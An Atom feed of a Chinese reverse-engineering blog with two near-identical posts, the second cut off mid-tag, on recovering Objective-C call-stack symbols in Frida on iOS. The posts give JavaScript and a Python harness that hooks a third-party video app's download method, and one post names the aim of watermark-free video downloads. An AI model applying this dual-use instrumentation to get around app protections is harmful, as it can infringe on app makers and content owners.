<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-07-02T11:42:04.659Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/untitled/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/untitled/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T11:42:04.659Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>在Android的逆向研究时候，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台逆向的时候，想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决过<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T11:29:36.401Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决过<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img 